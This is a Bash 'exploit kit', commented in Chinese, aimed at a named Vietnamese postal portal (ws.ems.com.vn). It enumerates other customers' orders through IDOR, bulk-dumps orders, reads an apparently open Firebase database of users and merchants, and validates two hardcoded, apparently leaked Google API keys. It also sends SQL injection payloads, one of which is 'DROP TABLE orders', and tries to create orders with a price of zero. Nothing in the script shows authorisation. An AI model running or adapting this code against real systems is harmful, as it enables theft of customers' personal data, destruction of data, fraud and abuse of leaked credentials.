#!/bin/bash
# EMS Vietnam Portal - Exploit工具包
# 目标: http://ws.ems.com.vn

BASE_URL="http://ws.ems.com.vn"
TOKEN=""

# 颜色输出
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}=== EMS Vietnam Portal Exploit Kit ===${NC}"
echo ""

# 1. 登录获取Token
login() {
    echo -e "${YELLOW}[*] 登录获取Token...${NC}"
    read -p "用户名: " username
    read -sp "密码: " password
    echo ""
    
    TOKEN=$(curl -s -X POST "${BASE_URL}/auth/login" \
        -H "Content-Type: application/json" \
        -d "{
            \"username\":\"${username}\",
            \"password\":\"${password}\",
            \"device_ime\":\"exploit_tool\",
            \"device_type\":\"android\"
        }" | jq -r '.data.token // empty')
    
    if [ -n "$TOKEN" ]; then
        echo -e "${GREEN}[+] Token获取成功: ${TOKEN:0:20}...${NC}"
        echo "$TOKEN" > .ems_token
        return 0
    else
        echo -e "${RED}[-] 登录失败${NC}"
        return 1
    fi
}

# 2. IDOR测试 - 订单追踪
test_idor_tracking() {
    echo -e "${YELLOW}[*] 测试IDOR - 订单追踪${NC}"
    
    if [ -z "$TOKEN" ]; then
        if [ -f .ems_token ]; then
            TOKEN=$(cat .ems_token)
        else
            echo -e "${RED}[-] 请先登录${NC}"
            return 1
        fi
    fi
    
    # 测试订单ID格式: EMS{9位数字}VN
    for i in $(seq 100000000 100000050); do
        order_id="EMS${i}VN"
        echo -e "${YELLOW}[*] 测试订单: ${order_id}${NC}"
        
        result=$(curl -s -X GET "${BASE_URL}/api/v1/orders/tracking/${order_id}" \
            -H "Authorization: Bearer ${TOKEN}" \
            -H "Content-Type: application/json")
        
        if echo "$result" | jq -e '.success' >/dev/null 2>&1; then
            echo -e "${GREEN}[+] 找到有效订单: ${order_id}${NC}"
            echo "$result" | jq '.' >> found_orders.json
        fi
        
        sleep 0.5
    done
}

# 3. 批量导出订单
dump_orders() {
    echo -e "${YELLOW}[*] 导出订单列表${NC}"
    
    if [ -z "$TOKEN" ]; then
        TOKEN=$(cat .ems_token 2>/dev/null)
    fi
    
    curl -s -X GET "${BASE_URL}/api/v1/orders/list?limit=9999&offset=0" \
        -H "Authorization: Bearer ${TOKEN}" \
        -H "Content-Type: application/json" \
        > all_orders.json
    
    echo -e "${GREEN}[+] 订单已保存到 all_orders.json${NC}"
}

# 4. 国际订单IDOR
test_intl_orders() {
    echo -e "${YELLOW}[*] 测试国际订单IDOR${NC}"
    
    if [ -z "$TOKEN" ]; then
        TOKEN=$(cat .ems_token 2>/dev/null)
    fi
    
    for i in $(seq 1 100); do
        result=$(curl -s -X GET "${BASE_URL}/api/v1/order-intl/tracking/EMSINTL${i}" \
            -H "Authorization: Bearer ${TOKEN}")
        
        if echo "$result" | grep -q "success"; then
            echo -e "${GREEN}[+] 国际订单: EMSINTL${i}${NC}"
            echo "$result" >> intl_orders.json
        fi
    done
}

# 5. Firebase未授权测试
test_firebase() {
    echo -e "${YELLOW}[*] 测试Firebase未授权访问${NC}"
    
    FIREBASE_URL="https://ems-khl-app-notify.firebaseio.com"
    
    endpoints=(
        "/.json"
        "/orders/.json"
        "/users/.json"
        "/notifications/.json"
        "/merchants/.json"
    )
    
    for ep in "${endpoints[@]}"; do
        echo -e "${YELLOW}[*] 测试: ${ep}${NC}"
        result=$(curl -s "${FIREBASE_URL}${ep}")
        
        if [ "$result" != "null" ] && [ -n "$result" ]; then
            echo -e "${GREEN}[+] 发现数据: ${ep}${NC}"
            echo "$result" > "firebase_${ep//\//_}.json"
        fi
    done
}

# 6. Google API Key验证
test_google_api() {
    echo -e "${YELLOW}[*] 测试泄露的Google API Key${NC}"
    
    API_KEYS=(
        "AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"
        "AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc"
    )
    
    for key in "${API_KEYS[@]}"; do
        echo -e "${YELLOW}[*] 测试Key: ${key:0:20}...${NC}"
        
        result=$(curl -s "https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=10.762622,106.660172&radius=1000&key=${key}")
        
        if echo "$result" | grep -q "results"; then
            echo -e "${GREEN}[+] API Key有效且可用${NC}"
            echo "Key: $key" >> valid_api_keys.txt
        fi
    done
}

# 7. SQL注入测试
test_sql_injection() {
    echo -e "${YELLOW}[*] SQL注入探测${NC}"
    
    if [ -z "$TOKEN" ]; then
        TOKEN=$(cat .ems_token 2>/dev/null)
    fi
    
    payloads=(
        "' OR '1'='1"
        "1' UNION SELECT NULL--"
        "1' AND SLEEP(5)--"
        "1'; DROP TABLE orders--"
    )
    
    for payload in "${payloads[@]}"; do
        echo -e "${YELLOW}[*] 测试Payload: ${payload}${NC}"
        
        start_time=$(date +%s)
        curl -s -X POST "${BASE_URL}/api/v1/orders/suggest-address" \
            -H "Authorization: Bearer ${TOKEN}" \
            -H "Content-Type: application/json" \
            -d "{\"keyword\":\"${payload}\"}" > /dev/null
        end_time=$(date +%s)
        
        if [ $((end_time - start_time)) -gt 4 ]; then
            echo -e "${GREEN}[+] 可能存在时间盲注${NC}"
        fi
    done
}

# 8. 价格篡改测试
test_price_manipulation() {
    echo -e "${YELLOW}[*] 测试价格篡改${NC}"
    
    if [ -z "$TOKEN" ]; then
        TOKEN=$(cat .ems_token 2>/dev/null)
    fi
    
    # 创建订单时尝试篡改价格
    curl -s -X POST "${BASE_URL}/api/v1/orders/create" \
        -H "Authorization: Bearer ${TOKEN}" \
        -H "Content-Type: application/json" \
        -d '{
            "sender_name": "Test",
            "receiver_name": "Test",
            "weight": 1000,
            "price": 0,
            "fee": 0
        }' > price_test.json
    
    echo -e "${GREEN}[+] 结果保存到 price_test.json${NC}"
}

# 9. 完整漏洞扫描
full_scan() {
    echo -e "${GREEN}=== 开始完整扫描 ===${NC}"
    
    login
    if [ $? -eq 0 ]; then
        test_idor_tracking
        dump_orders
        test_intl_orders
        test_firebase
        test_google_api
        test_sql_injection
        test_price_manipulation
        
        echo -e "${GREEN}=== 扫描完成 ===${NC}"
        echo -e "${YELLOW}[*] 检查以下文件:${NC}"
        ls -lh *.json *.txt 2>/dev/null
    fi
}

# 主菜单
show_menu() {
    echo ""
    echo "1. 登录获取Token"
    echo "2. IDOR测试 - 订单追踪"
    echo "3. 批量导出订单"
    echo "4. 国际订单IDOR"
    echo "5. Firebase未授权访问"
    echo "6. Google API Key验证"
    echo "7. SQL注入探测"
    echo "8. 价格篡改测试"
    echo "9. 完整扫描"
    echo "0. 退出"
    echo ""
    read -p "选择: " choice
    
    case $choice in
        1) login ;;
        2) test_idor_tracking ;;
        3) dump_orders ;;
        4) test_intl_orders ;;
        5) test_firebase ;;
        6) test_google_api ;;
        7) test_sql_injection ;;
        8) test_price_manipulation ;;
        9) full_scan ;;
        0) exit 0 ;;
        *) echo -e "${RED}无效选择${NC}" ;;
    esac
    
    show_menu
}

# 启动
if [ "$1" == "--auto" ]; then
    full_scan
else
    show_menu
fi
